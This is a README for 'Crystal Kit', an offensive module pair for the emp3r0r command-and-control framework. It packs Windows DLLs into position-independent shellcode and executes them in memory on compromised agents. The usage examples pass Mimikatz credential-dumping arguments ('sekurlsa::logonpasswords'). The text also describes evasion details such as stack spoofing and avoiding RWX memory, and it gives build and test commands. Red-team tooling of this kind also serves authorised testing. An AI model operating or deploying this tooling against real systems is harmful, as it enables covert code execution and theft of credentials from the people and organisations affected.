# Crystal Kit (emp3r0r module)

Crystal-Kit is a Crystal Palace integration for emp3r0r, replicating the Sliver
port [`licitrasimone/crystal-kit-sliver`](https://github.com/licitrasimone/crystal-kit-sliver).

It provides two modules:

| Module | Type | Purpose |
|--------|------|---------|
| `crystal_pack` | local (C2) | Convert a Windows DLL into Crystal Palace PICO shellcode |
| `crystal_kit`  | agent (`dll`) | Run a PICO blob in memory on the agent, then unload |

Crystal Palace links a Windows PE/DLL into a position-independent code (PICO)
blob using the bundled `postex-loader` spec, which resolves APIs at runtime via
ror13 hashes — **no `--gmh`/`--gpa` addresses are required**.

## Usage

### 1. Convert a DLL into PICO (`crystal_pack`, C2-side)

```text
crystal_pack --dll /path/to/postex.dll
crystal_pack --dll /path/to/postex.dll --output /path/to/postex.pico.bin
crystal_pack --dll /path/to/postex.dll --args "sekurlsa::logonpasswords exit"
```

- `--dll` is the local PE/DLL to wrap.
- `--args` is baked into the PICO at link time and delivered to the DLL's
  `DllMain` via `lpReserved` when no runtime args are supplied.

### 2. Run a PICO on the agent (`crystal_kit`, agent-side)

```text
crystal_kit --file /path/on/agent/to/payload.pico.bin
crystal_kit --file mem:///payload.pico.bin
crystal_kit --file mem:///payload.pico.bin --args "sekurlsa::logonpasswords exit"
```

- `--file` is the Crystal Palace PICO `.bin` on the agent (local path or
  `mem:///...`).
- `--args` is an optional runtime string delivered to the PICO entry and then
  to the post-ex DLL's `DllMain` (`lpReserved` on `DLL_PROCESS_ATTACH`) as
  `<write_handle_hex>|<args>`. The packed DLL can stream stdout/stderr to that
  inherited pipe handle; the loader drains it and returns the output to the
  operator through the module's callback, so it reaches the C2 terminal.
  Runtime args override baked args. When `--args` is omitted, baked args are
  passed as-is.

The `crystal_kit` loader DLL (`CrystalKit.x64.dll`) exports the COFFLoader-style
`LoadAndRun(char *argsBuffer, uint32_t bufferSize, goCallback callback)` and is
loaded in memory by the agent, then unloaded after the job is done.

```c
int __cdecl LoadAndRun(char *argsBuffer, uint32_t bufferSize, goCallback callback);
```

The wrapper allocates the PICO into a `VirtualAlloc(RW)` region, flips it to RX
with `VirtualProtect`, and jumps to the Crystal Palace entrypoint. No
`PAGE_EXECUTE_READWRITE` mapping is ever held. When runtime args are supplied,
the wrapper also creates an anonymous pipe and hands the packed DLL the write
handle, then drains the read end and forwards the output through the callback
so it appears in the C2 terminal.

## Build

```bash
bash make_all.sh
```

- `x86_64-w64-mingw32-gcc` for `CrystalKit.x64.dll` and the postex-loader
  objects.
- `nasm` for the Draugr stack-spoofing stub.
- Java + `crystalpalace/crystalpalace.jar` for the `crystal_pack` link step.

## Notes

- x64 only (upstream Crystal-Kit constraint).
- The `crystal_kit` loader DLL is unloaded by the agent after `LoadAndRun`
  returns; the PICO region itself is freed after the entrypoint returns.
- Native crashes inside the PICO are contained by the same Vectored Exception
  Handler used by the COFFLoader DLL path (`RunWindowsCOFFViaDLL`); a fault is
  converted into an operator-visible error instead of killing the agent.
- The `loader/` directory is the upstream Crystal-Kit use-case-A loader and is
  reserved for a future agent-delivery stager; it is not used by these two
  modules yet.

## Testing

```bash
# Build the DLL module payload + postex-loader objects
bash make_all.sh

# Build the benign PICO fixtures (needs mingw + java + crystalpalace.jar)
bash generate-test-pico.sh

# Run the module tests (Windows amd64)
cd ../.. && go test ./internal/cc/modules -run TestCrystalKit -v
```

`TestCrystalKitPackAndRunWorkflow` additionally compiles
`testdata/cmdexec.c`, packs it into PICO via `crystal_pack`, runs it through
`crystal_kit` with `--args "ipconfig /all"`, and asserts the command output.
It requires `bash` and `java` on `PATH`.

## Attribution

This port follows the cross-C2 pattern of
[`Crystal-Kit-Xenon`](https://github.com/nickswink/Crystal-Kit-Xenon) and the
Sliver port [`crystal-kit-sliver`](https://github.com/licitrasimone/crystal-kit-sliver).

- **rasta-mouse** — [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit) (MIT)
- **nickswink** — [Crystal-Kit-Xenon](https://github.com/nickswink/Crystal-Kit-Xenon) (MIT)
- **Simone Licitra (`licitrasimone`)** — [crystal-kit-sliver](https://github.com/licitrasimone/crystal-kit-sliver) (MIT)
- **Raphael Mudge / AFF-WG** — [Crystal Palace](https://tradecraftgarden.org/) (BSD-3-Clause)
- **TrustedSec** — [COFFLoader](https://github.com/TrustedSec/COFFLoader) (BSD-3-Clause)
